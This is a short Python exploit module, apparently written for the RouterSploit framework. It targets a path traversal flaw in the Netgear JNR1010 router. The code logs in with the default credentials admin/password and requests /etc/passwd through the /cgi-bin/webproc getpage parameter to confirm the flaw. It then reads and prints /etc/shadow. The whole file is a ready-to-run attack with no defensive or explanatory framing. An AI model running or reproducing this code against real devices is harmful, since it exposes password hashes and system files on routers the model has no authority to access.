# rsf exploit module
# title: Netgear JNR1010 Path Traversal
# description: Exploits Netgear JNR1010 Path Traversal vulnerability to read files.
# author: ediop3

import requests

class Exploit:
    def __init__(self):
        self.target = ""
        self.port = 80
        self.username = "admin"
        self.password = "password"
        self.filename = "/etc/shadow"
        self.session = requests.Session()

    def run(self):
        if self.check():
            path = f"/cgi-bin/webproc?getpage={self.filename}&var:language=en_us&var:language=en_us&var:menu=advanced&var:page=basic_home"

            try:
                response = self.session.get(
                    f"http://{self.target}:{self.port}{path}",
                    auth=(self.username, self.password),
                    timeout=5
                )
                if response.status_code == 200 and response.text:
                    print(f"[+] Success! File: {self.filename}")
                    print(response.text)
                else:
                    print("[-] Exploit failed")
            except:
                print("[-] Exploit failed")
        else:
            print("[-] Device seems to be not vulnerable")

    def check(self):
        path = "/cgi-bin/webproc?getpage=/etc/passwd&var:language=en_us&var:language=en_us&var:menu=advanced&var:page=basic_home"

        try:
            response = self.session.get(
                f"http://{self.target}:{self.port}{path}",
                auth=(self.username, self.password),
                timeout=5
            )
            if response is None:
                return False

            return "root:" in response.text
        except:
            return False
